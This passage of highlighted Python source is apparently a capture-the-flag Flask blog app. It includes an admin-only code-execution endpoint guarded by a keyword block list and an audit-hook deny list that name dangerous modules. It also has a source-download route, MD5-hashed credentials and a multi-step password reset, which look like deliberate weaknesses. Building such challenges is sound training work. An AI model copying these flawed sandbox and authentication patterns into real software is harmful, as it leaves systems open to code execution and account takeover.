class="string">&#x27;KAlsidhKUHLKjhdskfhkajHSKDJH&#x27;</span>.encode()).hexdigest(),</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;admin@example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;id_card&#x27;</span>: <span class="string">&#x27;110101199003072316&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phone&#x27;</span>: <span class="string">&#x27;13800138000&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SandboxSecurityException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Non-ASCII characters are not allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line">    dangerous_keywords = [  <span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;hasattr&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;quit&quot;</span>, <span class="string">&quot;vars&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;locals&quot;</span>, <span class="string">&quot;delattr&quot;</span>, <span class="string">&quot;help&quot;</span>, <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;requests&quot;</span>, <span class="string">&quot;socket&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;urllib&quot;</span>, <span class="string">&quot;ctypes&quot;</span>, <span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;pickle&quot;</span>, <span class="string">&quot;input&quot;</span>, <span class="string">&quot;codecs&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__getattribute__&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__bases__&quot;</span>, <span class="string">&quot;__mro__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__init__&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;__name__&quot;</span>, <span class="string">&quot;__dict__&quot;</span>, <span class="string">&quot;__code__&quot;</span>, <span class="string">&quot;__closure__&quot;</span>, <span class="string">&quot;__defaults__&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;mro&quot;</span>, <span class="string">&quot;subclasses&quot;</span>, <span class="string">&quot;importlib&quot;</span>, <span class="string">&quot;load&quot;</span>, <span class="string">&quot;loads&quot;</span>, <span class="string">&quot;dump&quot;</span>, <span class="string">&quot;dumps&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;spawn&quot;</span>, <span class="string">&quot;fork&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;chdir&quot;</span>, <span class="string">&quot;remove&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;rmdir&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;listdir&quot;</span>, <span class="string">&quot;environ&quot;</span>, <span class="string">&quot;getenv&quot;</span>, <span class="string">&quot;putenv&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;read&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;flush&quot;</span>, <span class="string">&quot;seek&quot;</span>, <span class="string">&quot;tell&quot;</span>, <span class="string">&quot;truncate&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;connect&quot;</span>, <span class="string">&quot;bind&quot;</span>, <span class="string">&quot;listen&quot;</span>, <span class="string">&quot;accept&quot;</span>, <span class="string">&quot;send&quot;</span>, <span class="string">&quot;recv&quot;</span>, <span class="string">&quot;gethostname&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;gethostbyname&quot;</span>, <span class="string">&quot;getaddrinfo&quot;</span>, <span class="string">&quot;urlopen&quot;</span>, <span class="string">&quot;urlretrieve&quot;</span>, <span class="string">&quot;Request&quot;</span>,]</span><br><span class="line">    <span class="keyword">for</span> kw <span class="keyword">in</span> dangerous_keywords:</span><br><span class="line">        <span class="keyword">if</span> kw <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Disallowed keyword: <span class="subst">&#123;kw&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code_obj</span>):</span><br><span class="line">    opcode_io = StringIO()</span><br><span class="line">    dis(code_obj, file=opcode_io)</span><br><span class="line">    opcodes = opcode_io.getvalue().splitlines()</span><br><span class="line">    opcode_io.close()</span><br><span class="line"></span><br><span class="line">    allowed_globals = &#123;<span class="string">&quot;print&quot;</span>, <span class="string">&quot;len&quot;</span>, <span class="string">&quot;str&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;float&quot;</span>, <span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;seed&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;LOAD_GLOBAL&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            parts = line.split()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &gt;= <span class="number">4</span> <span class="keyword">and</span> parts[<span class="number">3</span>].startswith(<span class="string">&#x27;(&#x27;</span>) <span class="keyword">and</span> parts[<span class="number">3</span>].endswith(<span class="string">&#x27;)&#x27;</span>):</span><br><span class="line">                name = parts[<span class="number">3</span>][<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> allowed_globals:</span><br><span class="line">                    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Disallowed global access: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;IMPORT_NAME&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Import statements are not allowed&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;LOAD_METHOD&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">temp_audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    dangerous_events = &#123;</span><br><span class="line">        <span class="string">&quot;os.system&quot;</span>, <span class="string">&quot;os.popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.call&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.check_output&quot;</span>, <span class="string">&quot;subprocess.run&quot;</span>, <span class="string">&quot;subprocess.getoutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;builtins.eval&quot;</span>, <span class="string">&quot;builtins.compile&quot;</span>, <span class="string">&quot;builtins.__import__&quot;</span>, <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">        <span class="string">&quot;import&quot;</span>, <span class="string">&quot;importlib&quot;</span>, <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;importlib.import_module&quot;</span>,</span><br><span class="line">        <span class="string">&quot;open&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;os.open&quot;</span>, <span class="string">&quot;os.read&quot;</span>, <span class="string">&quot;os.write&quot;</span>,</span><br><span class="line">        <span class="string">&quot;urllib.request.urlopen&quot;</span>, <span class="string">&quot;urllib.request.Request&quot;</span>, <span class="string">&quot;requests.&quot;</span>, <span class="string">&quot;socket.socket&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http.client.HTTPConnection&quot;</span>, <span class="string">&quot;http.client.HTTPSConnection&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ctypes.&quot;</span>, <span class="string">&quot;marshal.loads&quot;</span>, <span class="string">&quot;os.execv&quot;</span>, <span class="string">&quot;os.execve&quot;</span>, <span class="string">&quot;os.execvp&quot;</span>, <span class="string">&quot;os.execvpe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.environ&quot;</span>, <span class="string">&quot;os.getenv&quot;</span>, <span class="string">&quot;os.getpid&quot;</span>, <span class="string">&quot;os.getuid&quot;</span>,</span><br><span class="line">        <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;subprocess.Popen&quot;</span>, <span class="string">&quot;os.system&quot;</span>,</span><br><span class="line">        <span class="string">&quot;os.remove&quot;</span>, <span class="string">&quot;os.unlink&quot;</span>, <span class="string">&quot;os.chmod&quot;</span>, <span class="string">&quot;os.chown&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> dangerous_event <span class="keyword">in</span> dangerous_events:</span><br><span class="line">        <span class="keyword">if</span> event == dangerous_event <span class="keyword">or</span> event.startswith(dangerous_event + <span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_id_card</span>(<span class="params">id_card</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d&#123;17&#125;[\dXx]$&#x27;</span>, id_card))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;^1[3-9]\d&#123;9&#125;$&#x27;</span>, phone))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BLOG_DIR = <span class="string">&#x27;blog&#x27;</span></span><br><span class="line">os.makedirs(BLOG_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_blog_posts</span>():</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(BLOG_DIR):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.html&#x27;</span>):</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+)、(.+)\.html$&#x27;</span>, filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                num = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                title = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">                posts.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;num&#x27;</span>: num,</span><br><span class="line">                    <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">                    <span class="string">&#x27;filename&#x27;</span>: filename</span><br><span class="line">                &#125;)</span><br><span class="line">    posts.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;num&#x27;</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> posts</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_next_post_number</span>():</span><br><span class="line">    max_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(BLOG_DIR):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.html&#x27;</span>):</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;^(\d+)、&#x27;</span>, filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                num = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">if</span> num &gt; max_num:</span><br><span class="line">                    max_num = num</span><br><span class="line">    <span class="keyword">return</span> max_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    logged_in = <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session</span><br><span class="line">    posts = get_blog_posts()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, logged_in=logged_in, posts=posts)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            flash(<span class="string">&#x27;请输入用户名和密码&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pwd_md5 = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line">        user = users.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user[<span class="string">&#x27;password_md5&#x27;</span>] == pwd_md5:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/admin&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;用户名或密码错误&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blog/&lt;filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_blog</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename.endswith(<span class="string">&#x27;.html&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;无效文件&quot;</span>, <span class="number">400</span></span><br><span class="line">    filepath = os.path.join(BLOG_DIR, filename)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;文章不存在&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    next_num = get_next_post_number()</span><br><span class="line">    posts = get_blog_posts()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], next_num=next_num, posts=posts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/publish&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">publish_blog</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;未登录&#x27;</span>&#125;), <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> title <span class="keyword">or</span> <span class="keyword">not</span> content:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;标题和内容不能为空&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    next_num = get_next_post_number()</span><br><span class="line">    safe_title = <span class="string">&quot;&quot;</span>.join(c <span class="keyword">if</span> c.isalnum() <span class="keyword">or</span> c <span class="keyword">in</span> (<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;_&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> title)</span><br><span class="line">    filename = <span class="string">f&quot;<span class="subst">&#123;next_num&#125;</span>、<span class="subst">&#123;safe_title&#125;</span>.html&quot;</span></span><br><span class="line">    filepath = os.path.join(BLOG_DIR, filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">f&#x27;博客《<span class="subst">&#123;title&#125;</span>》发布成功！&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filename = urllib.parse.unquote(filename)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line">    file_path = os.path.abspath(filename)</span><br><span class="line">    project_root = os.path.abspath(os.getcwd())</span><br><span class="line">    blog_dir = os.path.abspath(<span class="string">&#x27;blog&#x27;</span>)</span><br><span class="line">    allowed_dirs = [project_root, blog_dir]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(file_path.startswith(allowed + os.sep) <span class="keyword">or</span> file_path == allowed <span class="keyword">for</span> allowed <span class="keyword">in</span> allowed_dirs):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    basename = os.path.basename(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (basename == <span class="string">&#x27;app.py&#x27;</span> <span class="keyword">or</span> basename.endswith(<span class="string">&#x27;.html&#x27;</span>)):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/oj&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oj</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        code = data.get(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> code:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;代码不能为空&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            source_simple_check(code)</span><br><span class="line">            compiled_code = <span class="built_in">compile</span>(code, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">            source_opcode_checker(compiled_code)</span><br><span class="line">            safe_builtins = &#123;</span><br><span class="line">                <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>,</span><br><span class="line">                <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">                <span class="string">&quot;str&quot;</span>: <span class="built_in">str</span>,</span><br><span class="line">                <span class="string">&quot;int&quot;</span>: <span class="built_in">int</span>,</span><br><span class="line">                <span class="string">&quot;float&quot;</span>: <span class="built_in">float</span>,</span><br><span class="line">                <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">                <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">                <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">                <span class="string">&quot;range&quot;</span>:<span class="built_in">range</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            sys.addaudithook(temp_audit_hook)</span><br><span class="line">            stdout = StringIO()</span><br><span class="line">            <span class="keyword">with</span> redirect_stdout(stdout):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;CTF_SANDBOX&quot;</span> + <span class="built_in">str</span>(<span class="built_in">id</span>(code)))</span><br><span class="line">                    <span class="built_in">exec</span>(compiled_code, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;, &#123;&#125;)</span><br><span class="line">                <span class="keyword">finally</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">hasattr</span>(sys, <span class="string">&#x27;audithooks&#x27;</span>):</span><br><span class="line">                        sys.audithooks.clear()</span><br><span class="line"></span><br><span class="line">            output = stdout.getvalue()</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;output&quot;</span>: output&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> SandboxSecurityException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">f&quot;安全拦截: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">403</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">f&quot;执行错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_page</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;reset.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/reset/step1&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_step1</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    email = data.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    user = users.get(username)</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">and</span> user[<span class="string">&#x27;email&#x27;</span>] == email:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;邮箱验证成功&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;用户名或邮箱不匹配&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/reset/step2&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_step2</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    id_card = data.get(<span class="string">&#x27;id_card&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    phone = data.get(<span class="string">&#x27;phone&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    user = users.get(username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;无效用户&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">            is_valid_id_card(id_card) <span class="keyword">and</span></span><br><span class="line">            is_valid_phone(phone) <span class="keyword">and</span></span><br><span class="line">            user[<span class="string">&#x27;id_card&#x27;</span>] == id_card <span class="keyword">and</span></span><br><span class="line">            user[<span class="string">&#x27;phone&#x27;</span>] == phone</span><br><span class="line">    ):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;身份信息验证成功&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;身份证号或手机号错误&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/reset/step3&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset_step3</span>():</span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    new_password = data.get(<span class="string">&#x27;new_password&#x27;</span>)</span><br><span class="line">    confirm_password = data.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> new_password != confirm_password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span 